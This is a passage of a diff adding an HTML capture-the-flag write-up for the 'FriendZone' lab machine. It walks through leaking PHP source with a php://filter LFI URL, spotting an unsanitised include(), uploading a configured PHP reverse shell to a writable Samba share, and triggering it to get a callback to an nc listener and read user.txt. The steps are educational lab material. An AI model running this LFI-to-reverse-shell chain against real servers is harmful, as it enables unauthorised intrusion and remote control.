+        </div><br>
+        <br>
+        Nothing useful there, but dashboard.php might be interesting.<br>
+        <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=dashboard</code><br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo="</span>&nbsp;&gt;&nbsp;dashboard.b64<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;dashboard.b64&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;dashboard.php<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;dashboard.php<br>
+                &lt;?php<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">//</span>echo&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;h2&gt;Smart&nbsp;photo&nbsp;script&nbsp;for&nbsp;friendzone&nbsp;corp&nbsp;!&lt;/h2&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">//</span>echo&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;h3&gt;*&nbsp;Note&nbsp;:&nbsp;we&nbsp;are&nbsp;dealing&nbsp;with&nbsp;a&nbsp;beginner&nbsp;php&nbsp;developer&nbsp;and&nbsp;the&nbsp;application&nbsp;is&nbsp;not&nbsp;tested&nbsp;yet&nbsp;!&lt;/h3&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;title&gt;FriendZone&nbsp;Admin&nbsp;!&lt;/title&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$auth</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_COOKIE</span>[<span style="color:#3ad900;font-weight:400">"FriendZoneAuth"</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$auth</span>&nbsp;===&nbsp;<span style="color:#3ad900;font-weight:400">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span style="color:#ff9d00;font-weight:700">){</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;h2&gt;Smart&nbsp;photo&nbsp;script&nbsp;for&nbsp;friendzone&nbsp;corp&nbsp;!&lt;/h2&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;h3&gt;*&nbsp;Note&nbsp;:&nbsp;we&nbsp;are&nbsp;dealing&nbsp;with&nbsp;a&nbsp;beginner&nbsp;php&nbsp;developer&nbsp;and&nbsp;the&nbsp;application&nbsp;is&nbsp;not&nbsp;tested&nbsp;yet&nbsp;!&lt;/h3&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(!</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">"image_id"</span>]<span style="color:#ff9d00;font-weight:700">)){</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;br&gt;&lt;br&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;p&gt;image_name&nbsp;param&nbsp;is&nbsp;missed&nbsp;!&lt;/p&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;p&gt;please&nbsp;enter&nbsp;it&nbsp;to&nbsp;show&nbsp;the&nbsp;image&lt;/p&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;p&gt;default&nbsp;is&nbsp;image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">}</span>else<span style="color:#ff9d00;font-weight:700">{</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">$image</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">"image_id"</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;img&nbsp;src='images/$image'&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;h1&gt;Something&nbsp;went&nbsp;worng&nbsp;!&nbsp;,&nbsp;the&nbsp;script&nbsp;include&nbsp;wrong&nbsp;param&nbsp;!&lt;/h1&gt;&lt;/center&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;include<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">"pagename"</span>].<span style="color:#3ad900;font-weight:400">".php"</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">//</span>echo&nbsp;<span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">"pagename"</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span>else<span style="color:#ff9d00;font-weight:700">{</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;center&gt;&lt;p&gt;You&nbsp;can't&nbsp;see&nbsp;the&nbsp;content&nbsp;!&nbsp;,&nbsp;please&nbsp;login&nbsp;!&lt;/center&gt;&lt;/p&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                ?&gt;
+            </div>
+        </div><br>
+        <br>
+        There's our file inclusion vulnerability - <code>include($_GET["pagename"].".php")</code><br>
+        We can only include files that end in <code>.php</code>.<br>
+        Part of why this took me so long to solve was because I first testing the LFI by trying to include a text file.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) LFI to shell</strong></h2><br>
+        Now we need to upload a shell that we can inlcude in our LFI.<br>
+        <br>
+        <code>https://uploads.friendzone.red/</code> is a rabbit hole, all it does is print a timestamp and a string.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Instead, your efforts should be directed towards samba.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;smbclient&nbsp;-L&nbsp;10.10.10.123<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <br>
+                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                print$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Printer&nbsp;Drivers<br>
+                Files&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>Files<br>
+                general&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files<br>
+                Development&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;Service&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FriendZone&nbsp;server&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Samba,&nbsp;Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">workgroup</span>&nbsp;listing.<br>
+                <br>
+                Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                <br>
+                Workgroup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FRIENDZONE
+            </div>
+        </div><br>
+        <br>
+        This line - <code>FriendZone Samba Server Files /etc/Files</code> - hints at the file path of where your shell will be uploaded.<br>
+        <br>
+        Browsing the Development share, you find that you can <code>put</code> files.<br>
+        Prep a php reverse shell and upload it to the <code>Development</code> share.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>php-reverse-shell.php&nbsp;.<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;php-reverse-shell.php&nbsp;memonkey.php<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;nano&nbsp;memonkey.php<br>
+                ...<br>
+                <span style="color:#7f0044;font-weight:400">$ip</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.13.120'</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$port</span>&nbsp;=&nbsp;4441<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                ...<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;smbclient&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>10.10.10.123<span style="color:#ff9d00;font-weight:700">/</span>Development<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;2019<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Jan&nbsp;23&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;2019<br>
+                &nbsp;&nbsp;rootfs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Fri&nbsp;Oct&nbsp;&nbsp;5&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>41<span style="color:#ff9d00;font-weight:700">:</span>10&nbsp;2018<br>
+                &nbsp;&nbsp;tesst.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;2019<br>
+                &nbsp;&nbsp;monkey.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3461&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;2019<br>
+                &nbsp;&nbsp;r.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5494&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>20&nbsp;2019<br>
+                &nbsp;&nbsp;she.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5501&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>27<span style="color:#ff9d00;font-weight:700">:</span>29&nbsp;2019<br>
+                &nbsp;&nbsp;test.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>35<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;2019<br>
+                &nbsp;&nbsp;revshell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5495&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;2019<br>
+                &nbsp;&nbsp;revshell.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5495&nbsp;&nbsp;Mon&nbsp;May&nbsp;20&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>18<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;2019<br>
+                <br>
+                9221460&nbsp;blocks&nbsp;of&nbsp;size&nbsp;1024.&nbsp;6432692&nbsp;blocks&nbsp;available<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;put&nbsp;memonkey.php<br>
+                putting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;memonkey.php&nbsp;as&nbsp;<span style="color:#333333;font-weight:400">\m</span>emonkey.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>34.0&nbsp;kb<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;34.0&nbsp;kb<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Prep to receive the shell by starting a listener:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;nc&nbsp;-lvnp&nbsp;4441<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;4441&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And using the local file inclusion vulnerability from dashboard.php, hit your newly uploaded php shell.<br>
+        You should get a callback on your listener!<br>
+        <br>
+        <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/memonkey.php</code><br>
+        <br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.13.120]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.123]&nbsp;40784<br>
+                Linux&nbsp;FriendZone&nbsp;4.15.0-36-generic&nbsp;<span style="color:#0088ff;font-weight:400">#39-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Sep&nbsp;24&nbsp;16:19:09&nbsp;UTC&nbsp;2018&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux</span><br>
+                &nbsp;19<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;up&nbsp;&nbsp;1<span style="color:#ff9d00;font-weight:700">:</span>08,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.04,&nbsp;0.10,&nbsp;0.12<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                friend&nbsp;&nbsp;&nbsp;pts<span style="color:#ff9d00;font-weight:700">/</span>1&nbsp;&nbsp;&nbsp;&nbsp;10.10.15.84&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;&nbsp;&nbsp;&nbsp;1.00s&nbsp;&nbsp;1.24s&nbsp;&nbsp;0.05s&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<span style="color:#ff9d00;font-weight:700">/</span>os.py<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cant&nbsp;access&nbsp;tty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                friend<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;friend<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                user.txt<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                a9ed...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
